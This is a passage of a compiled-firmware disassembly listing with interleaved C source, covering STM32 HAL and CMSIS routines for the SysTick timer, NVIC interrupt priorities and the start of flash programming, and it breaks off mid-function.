08001164 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 8001164:	b580      	push	{r7, lr}
 8001166:	b084      	sub	sp, #16
 8001168:	af00      	add	r7, sp, #0
 800116a:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 800116c:	2300      	movs	r3, #0
 800116e:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 8001170:	4b17      	ldr	r3, [pc, #92]	; (80011d0 <HAL_InitTick+0x6c>)
 8001172:	781b      	ldrb	r3, [r3, #0]
 8001174:	2b00      	cmp	r3, #0
 8001176:	d023      	beq.n	80011c0 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 8001178:	4b16      	ldr	r3, [pc, #88]	; (80011d4 <HAL_InitTick+0x70>)
 800117a:	681a      	ldr	r2, [r3, #0]
 800117c:	4b14      	ldr	r3, [pc, #80]	; (80011d0 <HAL_InitTick+0x6c>)
 800117e:	781b      	ldrb	r3, [r3, #0]
 8001180:	4619      	mov	r1, r3
 8001182:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001186:	fbb3 f3f1 	udiv	r3, r3, r1
 800118a:	fbb2 f3f3 	udiv	r3, r2, r3
 800118e:	4618      	mov	r0, r3
 8001190:	f000 f96d 	bl	800146e <HAL_SYSTICK_Config>
 8001194:	4603      	mov	r3, r0
 8001196:	2b00      	cmp	r3, #0
 8001198:	d10f      	bne.n	80011ba <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 800119a:	687b      	ldr	r3, [r7, #4]
 800119c:	2b0f      	cmp	r3, #15
 800119e:	d809      	bhi.n	80011b4 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 80011a0:	2200      	movs	r2, #0
 80011a2:	6879      	ldr	r1, [r7, #4]
 80011a4:	f04f 30ff 	mov.w	r0, #4294967295
 80011a8:	f000 f937 	bl	800141a <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 80011ac:	4a0a      	ldr	r2, [pc, #40]	; (80011d8 <HAL_InitTick+0x74>)
 80011ae:	687b      	ldr	r3, [r7, #4]
 80011b0:	6013      	str	r3, [r2, #0]
 80011b2:	e007      	b.n	80011c4 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 80011b4:	2301      	movs	r3, #1
 80011b6:	73fb      	strb	r3, [r7, #15]
 80011b8:	e004      	b.n	80011c4 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 80011ba:	2301      	movs	r3, #1
 80011bc:	73fb      	strb	r3, [r7, #15]
 80011be:	e001      	b.n	80011c4 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 80011c0:	2301      	movs	r3, #1
 80011c2:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 80011c4:	7bfb      	ldrb	r3, [r7, #15]
}
 80011c6:	4618      	mov	r0, r3
 80011c8:	3710      	adds	r7, #16
 80011ca:	46bd      	mov	sp, r7
 80011cc:	bd80      	pop	{r7, pc}
 80011ce:	bf00      	nop
 80011d0:	20000008 	.word	0x20000008
 80011d4:	20000000 	.word	0x20000000
 80011d8:	20000004 	.word	0x20000004

080011dc <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 80011dc:	b480      	push	{r7}
 80011de:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 80011e0:	4b06      	ldr	r3, [pc, #24]	; (80011fc <HAL_IncTick+0x20>)
 80011e2:	781b      	ldrb	r3, [r3, #0]
 80011e4:	461a      	mov	r2, r3
 80011e6:	4b06      	ldr	r3, [pc, #24]	; (8001200 <HAL_IncTick+0x24>)
 80011e8:	681b      	ldr	r3, [r3, #0]
 80011ea:	4413      	add	r3, r2
 80011ec:	4a04      	ldr	r2, [pc, #16]	; (8001200 <HAL_IncTick+0x24>)
 80011ee:	6013      	str	r3, [r2, #0]
}
 80011f0:	bf00      	nop
 80011f2:	46bd      	mov	sp, r7
 80011f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80011f8:	4770      	bx	lr
 80011fa:	bf00      	nop
 80011fc:	20000008 	.word	0x20000008
 8001200:	200003b8 	.word	0x200003b8

08001204 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 8001204:	b480      	push	{r7}
 8001206:	af00      	add	r7, sp, #0
  return uwTick;
 8001208:	4b03      	ldr	r3, [pc, #12]	; (8001218 <HAL_GetTick+0x14>)
 800120a:	681b      	ldr	r3, [r3, #0]
}
 800120c:	4618      	mov	r0, r3
 800120e:	46bd      	mov	sp, r7
 8001210:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001214:	4770      	bx	lr
 8001216:	bf00      	nop
 8001218:	200003b8 	.word	0x200003b8

0800121c <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 800121c:	b580      	push	{r7, lr}
 800121e:	b084      	sub	sp, #16
 8001220:	af00      	add	r7, sp, #0
 8001222:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 8001224:	f7ff ffee 	bl	8001204 <HAL_GetTick>
 8001228:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 800122a:	687b      	ldr	r3, [r7, #4]
 800122c:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 800122e:	68fb      	ldr	r3, [r7, #12]
 8001230:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001234:	d005      	beq.n	8001242 <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 8001236:	4b0a      	ldr	r3, [pc, #40]	; (8001260 <HAL_Delay+0x44>)
 8001238:	781b      	ldrb	r3, [r3, #0]
 800123a:	461a      	mov	r2, r3
 800123c:	68fb      	ldr	r3, [r7, #12]
 800123e:	4413      	add	r3, r2
 8001240:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 8001242:	bf00      	nop
 8001244:	f7ff ffde 	bl	8001204 <HAL_GetTick>
 8001248:	4602      	mov	r2, r0
 800124a:	68bb      	ldr	r3, [r7, #8]
 800124c:	1ad3      	subs	r3, r2, r3
 800124e:	68fa      	ldr	r2, [r7, #12]
 8001250:	429a      	cmp	r2, r3
 8001252:	d8f7      	bhi.n	8001244 <HAL_Delay+0x28>
  {
  }
}
 8001254:	bf00      	nop
 8001256:	bf00      	nop
 8001258:	3710      	adds	r7, #16
 800125a:	46bd      	mov	sp, r7
 800125c:	bd80      	pop	{r7, pc}
 800125e:	bf00      	nop
 8001260:	20000008 	.word	0x20000008

08001264 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001264:	b480      	push	{r7}
 8001266:	b085      	sub	sp, #20
 8001268:	af00      	add	r7, sp, #0
 800126a:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 800126c:	687b      	ldr	r3, [r7, #4]
 800126e:	f003 0307 	and.w	r3, r3, #7
 8001272:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8001274:	4b0c      	ldr	r3, [pc, #48]	; (80012a8 <__NVIC_SetPriorityGrouping+0x44>)
 8001276:	68db      	ldr	r3, [r3, #12]
 8001278:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 800127a:	68ba      	ldr	r2, [r7, #8]
 800127c:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 8001280:	4013      	ands	r3, r2
 8001282:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001284:	68fb      	ldr	r3, [r7, #12]
 8001286:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 8001288:	68bb      	ldr	r3, [r7, #8]
 800128a:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 800128c:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8001290:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001294:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 8001296:	4a04      	ldr	r2, [pc, #16]	; (80012a8 <__NVIC_SetPriorityGrouping+0x44>)
 8001298:	68bb      	ldr	r3, [r7, #8]
 800129a:	60d3      	str	r3, [r2, #12]
}
 800129c:	bf00      	nop
 800129e:	3714      	adds	r7, #20
 80012a0:	46bd      	mov	sp, r7
 80012a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012a6:	4770      	bx	lr
 80012a8:	e000ed00 	.word	0xe000ed00

080012ac <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 80012ac:	b480      	push	{r7}
 80012ae:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 80012b0:	4b04      	ldr	r3, [pc, #16]	; (80012c4 <__NVIC_GetPriorityGrouping+0x18>)
 80012b2:	68db      	ldr	r3, [r3, #12]
 80012b4:	0a1b      	lsrs	r3, r3, #8
 80012b6:	f003 0307 	and.w	r3, r3, #7
}
 80012ba:	4618      	mov	r0, r3
 80012bc:	46bd      	mov	sp, r7
 80012be:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012c2:	4770      	bx	lr
 80012c4:	e000ed00 	.word	0xe000ed00

080012c8 <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80012c8:	b480      	push	{r7}
 80012ca:	b083      	sub	sp, #12
 80012cc:	af00      	add	r7, sp, #0
 80012ce:	4603      	mov	r3, r0
 80012d0:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80012d2:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012d6:	2b00      	cmp	r3, #0
 80012d8:	db0b      	blt.n	80012f2 <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 80012da:	79fb      	ldrb	r3, [r7, #7]
 80012dc:	f003 021f 	and.w	r2, r3, #31
 80012e0:	4907      	ldr	r1, [pc, #28]	; (8001300 <__NVIC_EnableIRQ+0x38>)
 80012e2:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012e6:	095b      	lsrs	r3, r3, #5
 80012e8:	2001      	movs	r0, #1
 80012ea:	fa00 f202 	lsl.w	r2, r0, r2
 80012ee:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 80012f2:	bf00      	nop
 80012f4:	370c      	adds	r7, #12
 80012f6:	46bd      	mov	sp, r7
 80012f8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012fc:	4770      	bx	lr
 80012fe:	bf00      	nop
 8001300:	e000e100 	.word	0xe000e100

08001304 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 8001304:	b480      	push	{r7}
 8001306:	b083      	sub	sp, #12
 8001308:	af00      	add	r7, sp, #0
 800130a:	4603      	mov	r3, r0
 800130c:	6039      	str	r1, [r7, #0]
 800130e:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001310:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001314:	2b00      	cmp	r3, #0
 8001316:	db0a      	blt.n	800132e <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001318:	683b      	ldr	r3, [r7, #0]
 800131a:	b2da      	uxtb	r2, r3
 800131c:	490c      	ldr	r1, [pc, #48]	; (8001350 <__NVIC_SetPriority+0x4c>)
 800131e:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001322:	0112      	lsls	r2, r2, #4
 8001324:	b2d2      	uxtb	r2, r2
 8001326:	440b      	add	r3, r1
 8001328:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 800132c:	e00a      	b.n	8001344 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800132e:	683b      	ldr	r3, [r7, #0]
 8001330:	b2da      	uxtb	r2, r3
 8001332:	4908      	ldr	r1, [pc, #32]	; (8001354 <__NVIC_SetPriority+0x50>)
 8001334:	79fb      	ldrb	r3, [r7, #7]
 8001336:	f003 030f 	and.w	r3, r3, #15
 800133a:	3b04      	subs	r3, #4
 800133c:	0112      	lsls	r2, r2, #4
 800133e:	b2d2      	uxtb	r2, r2
 8001340:	440b      	add	r3, r1
 8001342:	761a      	strb	r2, [r3, #24]
}
 8001344:	bf00      	nop
 8001346:	370c      	adds	r7, #12
 8001348:	46bd      	mov	sp, r7
 800134a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800134e:	4770      	bx	lr
 8001350:	e000e100 	.word	0xe000e100
 8001354:	e000ed00 	.word	0xe000ed00

08001358 <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 8001358:	b480      	push	{r7}
 800135a:	b089      	sub	sp, #36	; 0x24
 800135c:	af00      	add	r7, sp, #0
 800135e:	60f8      	str	r0, [r7, #12]
 8001360:	60b9      	str	r1, [r7, #8]
 8001362:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8001364:	68fb      	ldr	r3, [r7, #12]
 8001366:	f003 0307 	and.w	r3, r3, #7
 800136a:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 800136c:	69fb      	ldr	r3, [r7, #28]
 800136e:	f1c3 0307 	rsb	r3, r3, #7
 8001372:	2b04      	cmp	r3, #4
 8001374:	bf28      	it	cs
 8001376:	2304      	movcs	r3, #4
 8001378:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 800137a:	69fb      	ldr	r3, [r7, #28]
 800137c:	3304      	adds	r3, #4
 800137e:	2b06      	cmp	r3, #6
 8001380:	d902      	bls.n	8001388 <NVIC_EncodePriority+0x30>
 8001382:	69fb      	ldr	r3, [r7, #28]
 8001384:	3b03      	subs	r3, #3
 8001386:	e000      	b.n	800138a <NVIC_EncodePriority+0x32>
 8001388:	2300      	movs	r3, #0
 800138a:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 800138c:	f04f 32ff 	mov.w	r2, #4294967295
 8001390:	69bb      	ldr	r3, [r7, #24]
 8001392:	fa02 f303 	lsl.w	r3, r2, r3
 8001396:	43da      	mvns	r2, r3
 8001398:	68bb      	ldr	r3, [r7, #8]
 800139a:	401a      	ands	r2, r3
 800139c:	697b      	ldr	r3, [r7, #20]
 800139e:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 80013a0:	f04f 31ff 	mov.w	r1, #4294967295
 80013a4:	697b      	ldr	r3, [r7, #20]
 80013a6:	fa01 f303 	lsl.w	r3, r1, r3
 80013aa:	43d9      	mvns	r1, r3
 80013ac:	687b      	ldr	r3, [r7, #4]
 80013ae:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 80013b0:	4313      	orrs	r3, r2
         );
}
 80013b2:	4618      	mov	r0, r3
 80013b4:	3724      	adds	r7, #36	; 0x24
 80013b6:	46bd      	mov	sp, r7
 80013b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80013bc:	4770      	bx	lr
	...

080013c0 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 80013c0:	b580      	push	{r7, lr}
 80013c2:	b082      	sub	sp, #8
 80013c4:	af00      	add	r7, sp, #0
 80013c6:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 80013c8:	687b      	ldr	r3, [r7, #4]
 80013ca:	3b01      	subs	r3, #1
 80013cc:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 80013d0:	d301      	bcc.n	80013d6 <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 80013d2:	2301      	movs	r3, #1
 80013d4:	e00f      	b.n	80013f6 <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 80013d6:	4a0a      	ldr	r2, [pc, #40]	; (8001400 <SysTick_Config+0x40>)
 80013d8:	687b      	ldr	r3, [r7, #4]
 80013da:	3b01      	subs	r3, #1
 80013dc:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 80013de:	210f      	movs	r1, #15
 80013e0:	f04f 30ff 	mov.w	r0, #4294967295
 80013e4:	f7ff ff8e 	bl	8001304 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 80013e8:	4b05      	ldr	r3, [pc, #20]	; (8001400 <SysTick_Config+0x40>)
 80013ea:	2200      	movs	r2, #0
 80013ec:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 80013ee:	4b04      	ldr	r3, [pc, #16]	; (8001400 <SysTick_Config+0x40>)
 80013f0:	2207      	movs	r2, #7
 80013f2:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 80013f4:	2300      	movs	r3, #0
}
 80013f6:	4618      	mov	r0, r3
 80013f8:	3708      	adds	r7, #8
 80013fa:	46bd      	mov	sp, r7
 80013fc:	bd80      	pop	{r7, pc}
 80013fe:	bf00      	nop
 8001400:	e000e010 	.word	0xe000e010

08001404 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001404:	b580      	push	{r7, lr}
 8001406:	b082      	sub	sp, #8
 8001408:	af00      	add	r7, sp, #0
 800140a:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 800140c:	6878      	ldr	r0, [r7, #4]
 800140e:	f7ff ff29 	bl	8001264 <__NVIC_SetPriorityGrouping>
}
 8001412:	bf00      	nop
 8001414:	3708      	adds	r7, #8
 8001416:	46bd      	mov	sp, r7
 8001418:	bd80      	pop	{r7, pc}

0800141a <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800141a:	b580      	push	{r7, lr}
 800141c:	b086      	sub	sp, #24
 800141e:	af00      	add	r7, sp, #0
 8001420:	4603      	mov	r3, r0
 8001422:	60b9      	str	r1, [r7, #8]
 8001424:	607a      	str	r2, [r7, #4]
 8001426:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 8001428:	2300      	movs	r3, #0
 800142a:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 800142c:	f7ff ff3e 	bl	80012ac <__NVIC_GetPriorityGrouping>
 8001430:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 8001432:	687a      	ldr	r2, [r7, #4]
 8001434:	68b9      	ldr	r1, [r7, #8]
 8001436:	6978      	ldr	r0, [r7, #20]
 8001438:	f7ff ff8e 	bl	8001358 <NVIC_EncodePriority>
 800143c:	4602      	mov	r2, r0
 800143e:	f997 300f 	ldrsb.w	r3, [r7, #15]
 8001442:	4611      	mov	r1, r2
 8001444:	4618      	mov	r0, r3
 8001446:	f7ff ff5d 	bl	8001304 <__NVIC_SetPriority>
}
 800144a:	bf00      	nop
 800144c:	3718      	adds	r7, #24
 800144e:	46bd      	mov	sp, r7
 8001450:	bd80      	pop	{r7, pc}

08001452 <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001452:	b580      	push	{r7, lr}
 8001454:	b082      	sub	sp, #8
 8001456:	af00      	add	r7, sp, #0
 8001458:	4603      	mov	r3, r0
 800145a:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 800145c:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001460:	4618      	mov	r0, r3
 8001462:	f7ff ff31 	bl	80012c8 <__NVIC_EnableIRQ>
}
 8001466:	bf00      	nop
 8001468:	3708      	adds	r7, #8
 800146a:	46bd      	mov	sp, r7
 800146c:	bd80      	pop	{r7, pc}

0800146e <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 800146e:	b580      	push	{r7, lr}
 8001470:	b082      	sub	sp, #8
 8001472:	af00      	add	r7, sp, #0
 8001474:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 8001476:	6878      	ldr	r0, [r7, #4]
 8001478:	f7ff ffa2 	bl	80013c0 <SysTick_Config>
 800147c:	4603      	mov	r3, r0
}
 800147e:	4618      	mov	r0, r3
 8001480:	3708      	adds	r7, #8
 8001482:	46bd      	mov	sp, r7
 8001484:	bd80      	pop	{r7, pc}
	...

08001488 <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 8001488:	b580      	push	{r7, lr}
 800148a:	b086      	sub	sp, #24
 800148c:	af00      	add	r7, sp, #0
 800148e:	60f8      	str	r0, [r7, #12]
 8001490:	60b9      	str	r1, [r7, #8]
 8001492:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 8001496:	2300      	movs	r3, #0
 8001498:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800149a:	4b2f      	ldr	r3, [pc, #188]	; (8001558 <HAL_FLASH_Program+0xd0>)
 800149c:	781b      	ldrb	r3, [r3, #0]
 800149e:	2b01      	cmp	r3, #1
 80014a0:	d101      	bne.n	80014a6 <HAL_FLASH_Program+0x1e>
 80014a2:	2302      	movs	r3, #2
 80014a4:	e053      	b.n	800154e <HAL_FLASH_Program+0xc6>
 80014a6:	4b2c      	ldr	r3, [pc, #176]	; (8001558 <HAL_FLASH_Program+0xd0>)
 80014a8:	2201      	movs	r2, #1
 80014aa:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80014ac:	f24c 3050 	movw	r0, #50000	; 0xc350
 80014b0:	f000 f888 	bl	80015c4 <FLASH_WaitForLastOperation>
 80014b4:	4603      	mov	r3, r0
 80014b6:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 80014b8:	7dfb      	ldrb	r3, [r7, #23]
 80014ba:	2b00      	cmp	r3, #0
 80014bc:	d143      	bne.n	8001546 <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80014be:	4b26      	ldr	r3, [pc, #152]	; (8001558 <HAL_FLASH_Program+0xd0>)
 80014c0:	2200      	movs	r2, #0
 80014c2:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80014c4:	4b25      	ldr	r3, [pc, #148]	; (800155c <HAL_FLASH_Program+0xd4>)
 80014c6:	681b      	ldr	r3, [r3, #0]
 80014c8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80014cc:	2b00      	cmp	r3, #0
 80014ce:	d009      	beq.n	80014e4 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 80014d0:	4b22      	ldr	r3, [pc, #136]	; (800155c <HAL_FLASH_Program+0xd4>)
 80014d2:	681b      	ldr	r3, [r3, #0]
 80014d4:	4a21      	ldr	r2, [pc, #132]	; (800155c <HAL_FLASH_Program+0xd4>)
 80014d6:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80014da:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80014dc:	4b1e      	ldr	r3, [pc, #120]	; (8001558 <HAL_FLASH_Program+0xd0>)
 80014de:	2202      	movs	r2, #2
 80014e0:	771a      	strb	r2, [r3, #28]
 80014e2:	e002      	b.n	80014ea <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80014e4:	4b1c      	ldr	r3, [pc, #112]	; (8001558 <HAL_FLASH_Program+0xd0>)
 80014e6:	2200      	movs	r2, #0
 80014e8:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 80014ea:	68fb      	ldr	r3, [r7, #12]
 80014ec:	2b00      	cmp	r3, #0
 80014ee:	d107      	bne.n	8001500 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 80014f0:	e9d7 2300 	ldrd	r2, r3, [r7]
